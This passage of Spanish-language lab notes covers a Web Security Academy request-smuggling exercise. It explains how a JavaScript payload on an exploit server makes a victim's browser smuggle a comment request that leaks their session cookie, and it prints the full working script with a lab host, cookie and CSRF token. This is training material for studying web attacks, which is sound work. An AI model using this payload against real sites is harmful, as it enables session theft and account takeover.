En esta última parte, empaquetamos todo el ataque dentro de un payload JavaScript alojado en el servidor de explotación. El script desencadena una petición maliciosa con una petición fragmentada dentro del cuerpo, seguida de una solicitud controlada a /capture-me.

Una vez entregado a la víctima, su navegador ejecuta el código y realiza las peticiones necesarias que provocan la filtración de su cookie de sesión en el área pública del sitio. Extraemos esta información y usamos la cookie robada para acceder a su cuenta y resolver el laboratorio con éxito.

Solucion

el script bueno es este 
(<script>
  var smuggledRequest = [
    "POST /en/post/comment HTTP/1.1",
    "Host: 0a2700d203ea680480563a4e0009009d.h1-web-security-academy.net",
    "Cookie: session=10C0ZiNzSfrPlheSkA0EmCPoX1tgGb9H",
    "Content-Type: application/x-www-form-urlencoded",
    "Content-Length: 900",
    "",
    "csrf=AYsRFi6GRECmO9Nfp6MdsDsoe4ew7FRQ&postId=6&name=test&email=test@test.com&comment=smuggled"
  ].join("\r\n");

  fetch("https://0a2700d203ea680480563a4e0009009d.h1-web-security-academy.net", {
    method: "POST",
    body: smuggledRequest,
    mode: "no-cors",
    credentials: "include"
  });
</script>)
![[Pasted image 20250812221322.png]]
Aqui lo vemos reflejado
![[Pasted image 20250812221356.png]]
copiamos y pegamos en almacenamiento
![[Pasted image 20250812221507.png]]
![[Pasted image 20250812221531.png]]
